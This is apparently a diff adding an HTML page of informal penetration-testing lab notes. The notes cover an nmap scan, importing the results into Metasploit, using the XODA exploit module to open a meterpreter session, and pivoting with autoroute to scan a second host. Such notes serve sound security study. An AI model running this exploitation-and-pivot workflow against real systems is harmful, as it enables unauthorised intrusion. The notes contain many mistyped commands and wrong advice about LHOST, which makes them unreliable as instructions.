@@ -1,0 +1,108 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Scanning and Enumeration</title>
+</head><body>Enumerate the additional services from the port scanner<br/>
+<br/>
+so it help to see if there are any other misconfigurations<br/>
+<br/>
+Using the NMAP, Metasploit Framework<br/>
+<br/>
+Enumeration is the technics that can be taken from the hosts<br/>
+<br/>
+output the nmap scan to xml <br/>
+<br/>
+nmap -Pn -T4 -sV -O -F 10.0.65.90 -oX windows_local<br/>
+<br/>
+service postgresql start<br/>
+<br/>
+msfconsole to be installed in kali linux<br/>
+<br/>
+msfdb init<br/>
+msfdb reinit<br/>
+<br/>
+initiate the database<br/>
+<br/>
+workspace -a UATNmapScan<br/>
+<br/>
+check the root if the XML is ther<br/>
+db_import /root/<br/>
+<br/>
+dp_import /root/windows_local<br/>
+<br/>
+to make sure the xml is imported fine<br/>
+<br/>
+run this<br/>
+<br/>
+hosts<br/>
+<br/>
+---------------------- commands for the Metasploit to target the 2nd target in the network<br/>
+ifconfig to take eth1 ip address, make sure the target will be =1 or -1 of the said ip<br/>
+<br/>
+start the msf<br/>
+<br/>
+service postgresql start<br/>
+<br/>
+sf console<br/>
+<br/>
+db_status<br/>
+<br/>
+start the workspace<br/>
+<br/>
+search posrtscan<br/>
+<br/>
+use tcp or 5<br/>
+<br/>
+show options and there will bo no RHOSTS so add RHOSTS<br/>
+<br/>
+set RHOSTS target 1 Ip Address<br/>
+<br/>
+show options to confirm it will be the same as aset<br/>
+<br/>
+run<br/>
+<br/>
+curl target ip address<br/>
+<br/>
+title is XODAS<br/>
+<br/>
+search XODA<br/>
+<br/>
+use the xoda exploit<br/>
+<br/>
+show options<br/>
+<br/>
+*** here if LHOSTS are local ip of the machine, then it will not work, you need to set them to the traget IP<br/>
+<br/>
+set RHOSTS for the exploit to run on host<br/>
+<br/>
+set RHOSTS to target IP Address<br/>
+<br/>
+set TTARGETURI to /<br/>
+<br/>
+sow options target URI must be returned in here<br/>
+<br/>
+exploit the meterpreter session opened after the RUN command is run<br/>
+<br/>
+sysinfo target1<br/>
+find the local subnet<br/>
+<br/>
+as we ar on the target1 then the eth0 or other eth will have a totally different ip address so it will be the second target<br/>
+<br/>
+add route by "run autoroute target 2".<br/>
+<br/>
+<br/>
+TO FIND THE SERVICES RUNNING ON TARGET 2<br/>
+use auxiliary/scanner/portscan/tcp<br/>
+set RHOSTS &lt;target2_ip&gt;<br/>
+set PORTS 1-65535<br/>
+run<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
